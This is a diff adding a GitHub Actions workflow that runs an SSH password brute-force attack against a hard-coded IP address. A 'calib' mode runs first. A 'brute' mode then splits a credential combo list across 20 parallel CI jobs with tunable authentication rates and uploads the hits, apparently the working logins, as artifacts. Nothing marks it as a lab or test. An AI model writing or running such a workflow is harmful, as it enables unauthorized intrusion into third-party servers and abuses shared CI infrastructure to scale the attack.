@@ -1,0 +1,81 @@
+name: kf-ssh
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: "calib or brute"
+        default: "calib"
+      start:
+        description: "global start line (brute)"
+        default: "0"
+      end:
+        description: "global end line (brute)"
+        default: "0"
+      nshard:
+        description: "number of shards"
+        default: "1"
+      rate:
+        description: "auth per second per job"
+        default: "8"
+      maxsec:
+        description: "max seconds per job"
+        default: "1500"
+permissions:
+  contents: read
+jobs:
+  calib:
+    if: ${{ github.event.inputs.mode == 'calib' }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: pip install --quiet paramiko
+      - name: run
+        env:
+          MODE: calib
+          TARGET_HOST: "154.222.19.143"
+          TARGET_PORT: "22"
+          COMBO_FILE: "calib_combos.txt"
+        run: python3 ssh_run.py
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: calib-log
+          path: "*.txt"
+          if-no-files-found: ignore
+  brute:
+    if: ${{ github.event.inputs.mode == 'brute' }}
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    steps:
+      - uses: actions/checkout@v4
+      - name: deps
+        run: pip install --quiet paramiko
+      - name: run
+        env:
+          MODE: brute
+          TARGET_HOST: "154.222.19.143"
+          TARGET_PORT: "22"
+          COMBO_FILE: "plan_slice.txt"
+          DONE_FILE: "done_all.txt"
+          GLOBAL_OFFSET: ${{ github.event.inputs.start }}
+          SHARD: ${{ matrix.shard }}
+          NSHARD: ${{ github.event.inputs.nshard }}
+          RATE: ${{ github.event.inputs.rate }}
+          MAXSEC: ${{ github.event.inputs.maxsec }}
+          ARTI: "."
+        run: python3 ssh_run.py
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: shard-${{ matrix.shard }}
+          path: "hits_*.txt"
+          if-no-files-found: ignore
